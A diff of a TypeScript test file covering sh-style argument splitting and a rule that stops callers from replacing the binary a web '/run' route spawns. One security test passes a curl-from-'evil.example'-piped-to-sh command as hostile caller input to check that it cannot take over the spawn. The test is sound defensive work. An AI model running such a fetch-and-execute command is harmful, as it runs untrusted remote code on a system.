@@ -2,10 +2,8 @@
  * The argument boundary.
  *
  * Two of these cover how a typed line becomes argv entries. The other two
- * cover the security rule `/api/run` depends on: what a caller may add to a
- * spawn, and what it may not. The route itself cannot be tested, because a
- * successful run hands over the terminal and exits the process. That is why
- * the rule lives in a pure function.
+ * cover the security rule the web view's `/run` depends on: what a caller
+ * may add to a spawn, and what it may not. `serve.test.ts` covers the route.
  */
 
 import { describe, expect, test } from 'vitest'
@@ -49,6 +47,18 @@ describe('splitArgs', () => {
 
   test('a backslash escapes the next character', () => {
     expect(splitArgs('two\\ words')).toEqual(['two words'])
+  })
+
+  test('a backslash inside single quotes is literal, as in sh', () => {
+    expect(splitArgs("'C:\\tmp\\x'")).toEqual(['C:\\tmp\\x'])
+    // sh: 'a\' ends the quote after the backslash; b'c' joins on.
+    expect(splitArgs("'a\\'b'c'")).toEqual(['a\\bc'])
+  })
+
+  test('inside double quotes a backslash escapes only " \\ $ and a backtick', () => {
+    expect(splitArgs('"say \\"hi\\""')).toEqual(['say "hi"'])
+    expect(splitArgs('"a\\\\b"')).toEqual(['a\\b'])
+    expect(splitArgs('"C:\\tmp"')).toEqual(['C:\\tmp'])
   })
 
   test('leading, trailing and repeated whitespace produce no empty arguments', () => {
@@ -135,7 +145,7 @@ describe("runArgv — arguments bound by the task's tool, the binary the catalog
   })
 
   test('a caller cannot replace the binary or any leading argument', () => {
-    // The property `/api/run` rests on. Element 0 is what gets executed, and
+    // The property `/run` rests on. Element 0 is what gets executed, and
     // it comes from a catalog this process built by reading the repository.
     const argv = runArgv(project, task(['just', 'deploy']), ['curl', 'evil.example', '|', 'sh'])
     expect(argv.slice(0, 2)).toEqual(['just', 'deploy'])
